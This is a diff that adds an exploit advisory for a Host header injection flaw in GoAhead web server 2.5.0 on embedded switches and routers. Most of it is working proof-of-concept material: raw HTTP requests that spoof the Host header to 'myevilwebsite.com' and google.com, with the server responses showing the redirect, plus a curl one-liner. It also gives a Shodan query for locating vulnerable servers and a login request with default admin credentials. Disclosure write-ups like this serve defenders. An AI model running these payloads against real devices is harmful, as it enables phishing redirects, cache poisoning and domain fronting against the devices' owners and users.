@@ -1,0 +1,99 @@
+# Exploit Title: GoAhead Web server HTTP Header Injection.
+# Shodan Query: Server: Goahead
+# Discovered Date: 05/07/2019
+# Exploit Author: Ramikan
+# Vendor Homepage: https://www.embedthis.com/goahead/
+# Affected Version: 2.5.0 may be others.
+# Tested On Version: 2.5.0 in Cisco Switches and Net Gear routers.
+# Vendor Fix: N/A
+# CVE : N/A
+# CVSS v3: N/A
+# Category: Hardware, Web Apps
+# Reference : www.fact-in-hack.blogspot.com
+
+Vulnerability: Host Header Injection
+
+A Host Header Injection vulnerability may allow an attacker to spoof a particular Host header, allowing the attacker to render arbitrary links that point to a malicious website with poisoned Host header webpages.
+
+An issue was discovered in GoAhead web server version 2.5.0 (may be affected on other versions too). The values of the 'Host' headers are implicitly set as trusted while this should be forbidden, leading to potential host header injection attack and also the affected hosts can be used for domain fronting. This means affected hosts can be used by attackers to hide behind during various other attack
+
+PS: Affected on most of embedded webservers on hardware such as switches, routers, IOT and IP cameras. 
+
+
+POC: 1
+
+Request:
+
+POST /goform/login HTTP/1.1
+Host: myevilwebsite.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Connection: close
+Referer: https://46725846267.com/login.asp
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin&language=english
+
+
+Response:
+
+
+HTTP/1.0 302 Redirect
+Server: Goahead/2.5.0 PeerSec-MatrixSSL/3.2.1-OPEN
+Date: Fri Jul 12 15:28:29 2019
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+
+<html><head></head><body>
+		This document has moved to a new <a href="https://myevilwebsite.com/login.asp">location</a>.
+		Please update your documents to reflect the new location.
+		</body></html>
+
+POC: 2
+
+Request:
+
+POST /config/log_off_page.htm HTTP/1.1
+Host: google.com:443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: 12344
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 774
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+restoreUrl=&errorCollector=&ModuleTable=OK&rlPhdModuleTable%24VT=OK&rlPhdModuleStackUnit%24VT=Type%3D0%3BAccess%3D1%3BNumOfEnumerations%3D0%3BRange0%3D%5B-2147483648%2C2147483647%5D&rlPhdModuleIndex%24VT=Type%3D0%3BAccess%3D1%3BNumOfEnumerations%3D0%3BRange0%3D%5B-2147483648%2C2147483647%5D&rlPhdModuleType%24VT=Type%3D0%3BAccess%3D1%3BNumOfEnumerations%3D0%3BRange0%3D%5B-2147483648%2C2147483647%5D&rlPhdModuleNumberOfPorts%24VT=Type%3D0%3BAccess%3D1%3BNumOfEnumerations%3D0%3BRange0%3D%5B-2147483648%2C2147483647%5D&ModuleTable%24endVT=OK&rlPhdModuleStackUnit%24repeat%3F1=1&rlPhdModuleIndex%24repeat%3F1=1&rlPhdModuleType%24repeat%3F1=47&rlPhdModuleNumberOfPorts%24repeat%3F1=28&ModuleTable%24endRepeat%3F1=OK&userName%24query=%24enab15%24&password%24query=admin&x=0&y=0
+
+Response:
+
+HTTP/1.1 302 Redirect
+Server: GoAhead-Webs
+Date: Sat Oct 14 19:04:59 2006
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+Location: http://google.com:443/config/accessnotallowedpage.htm
+
+<html><head></head><body>
+                        This document has moved to a new <a href="http://google.com:443/config/accessnotallowedpage.htm">location</a>.
+                        Please update your documents to reflect the new location.
+                        </body></html>
+
+POC: 3 
+
+curl -k --header "Host: attacker domain" "victim's url"
+
+
+Initial Investigation:
+
+Potentially affected Part of the source code in GoAhead web server is in the ’http.c’ file, which contains 'host' parameter.
+https://github.com/embedthis/goahead/blob/master/src/http.c
